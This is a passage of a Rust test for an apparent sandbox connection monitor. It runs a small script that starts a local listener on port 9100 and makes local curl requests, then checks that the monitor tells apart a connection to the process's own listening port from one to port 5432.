                if let Event::Connect { pid, target } = event
                    && let Ok(mut list) = sink.lock()
                {
                    list.push((target.port(), listening_ports(pid)));
                }
            },
            |reason| panic!("monitor lost: {reason}"),
        );
    });
    let script = "python3 -c 'import socket,time\ns=socket.socket()\ns.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)\ns.bind((\"127.0.0.1\",9100))\ns.listen()\ntime.sleep(20)' &\nsleep 2\ncurl -s -m 3 http://127.0.0.1:9100/ > /dev/null 2>&1\ncurl -s -m 3 http://127.0.0.1:5432/ > /dev/null 2>&1\necho finished > /workspace/finished.txt\nexit 0\n";
    let mut spec = layout.spec_running(script);
    spec.supervisor_socket = Some(socket.clone());
    let status = backend()?.run(&spec);
    stop.store(true, Ordering::Relaxed);
    let _ = std::os::unix::net::UnixStream::connect(&socket);
    monitor.join().map_err(|_| "the monitor thread panicked")?;
    let status = status?;
    assert!(status.success(), "{status}");
    let seen = seen.lock().map(|list| list.clone()).unwrap_or_default();
    let own = seen.iter().find(|(port, _)| *port == 9100);
    let (_, listeners) = own.unwrap_or_else(|| panic!("no connect to 9100 in {seen:?}"));
    assert!(listeners.contains(&9100), "{listeners:?}");
    let unlisted = seen.iter().find(|(port, _)| *port == 5432);
    let (_, listeners) = unlisted.unwrap_or_else(|| panic!("no connect to 5432 in {seen:?}"));
    assert!(!listeners.contains(&5432), "{listeners:?}");
    Ok(())
}
